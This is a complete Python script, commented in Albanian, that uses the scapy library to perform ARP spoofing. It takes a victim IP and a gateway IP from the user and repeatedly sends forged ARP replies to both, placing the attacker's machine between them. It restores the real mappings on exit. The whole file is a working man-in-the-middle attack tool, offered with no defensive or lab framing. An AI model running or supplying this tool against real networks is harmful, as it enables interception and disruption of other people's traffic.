#Importimi i modulit scapy( modul i cili perdoret per network packets)
import scapy.all as scapy
import time

#Definimi i funksionit per te marr adresen MAC te vikimes se synuar
def mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_br = br / arp_request
    list_1 = scapy.srp(arp_req_br, timeout=5, verbose=False)[0]
    return list_1[0][1].hwsrc

#Definimi i nje funksion per spoofing
def spoof(targ, spoof):
    packet = scapy.ARP(op=2, pdst=targ, hwdst=mac(targ),
                       psrc=spoof)
    scapy.send(packet, verbose=False)

#Rivendosja e IP-se se viktimes dhe portes ne MAC adresat origjinale#
def reset(dest_ip, src_ip):
    dest_mac = mac(dest_ip)
    source_mac = mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

#Lejojme perdoruesin te vendos adresen dhe porten/Gateway IP te viktimes 
target_ip = input("[*] Enter Target IP > ")  
gateway_ip = input("[*] Enter Gateway IP > ")  

#Ne rastin kur perdoruesi shtyp CTRL+C printohet mesazhi i meposhtem dhe ndalohet programi
try:
    countpackets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        countpackets = countpackets + 2
        print("\r[*] Packets Sent " + str(countpackets), end="")
        time.sleep(2)  # Presim per 2 sekonda

except KeyboardInterrupt:
    print("\nCtrl + C pressed............. Quitting. ")
    reset(gateway_ip, target_ip)
    reset(target_ip, gateway_ip)
    print("[*] Arp Spoof Stopped, IP restored. ")